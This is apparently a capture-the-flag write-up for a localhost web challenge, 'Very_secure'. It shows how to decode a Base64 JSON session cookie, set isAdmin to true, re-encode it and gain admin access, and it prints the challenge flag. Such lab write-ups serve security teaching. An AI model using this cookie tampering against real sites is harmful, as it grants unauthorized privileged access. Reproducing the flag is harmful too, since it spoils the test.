# Writhup - Very_secure

## Description
only admin should see what s hidding and get the flag otherwise you r note allowed 

## Setup Instructions
1. Build the Docker container:
   ```sh
   chmod +x build.sh
   ./build.sh
   ```
2. The application will run on `http://localhost:5000`

## Exploiting the Vulnerability
1. Capture the `user` cookie from the request headers.
2. Decode the Base64 value:
   ```sh
   echo 'eyJ1c2VyTmFtZSI6ICJhbm9ueW1vdXMiLCAiaXNBZG1pbiI6IGZhbHNlfQ==' | base64 -d
   ```
3. Modify the JSON:
   ```json
   {
      "userName": "admin",
      "isAdmin": true
   }
   ```
4. Encode the modified JSON back to Base64:
   ```sh
   echo -n '{"userName": "admin", "isAdmin": true}' | base64
   ```
5. Replace the `user` cookie with the new value and refresh the page.
6. You should now see the flag!
```
NHD{be_cautious_when_serializing_and_deserializing}
```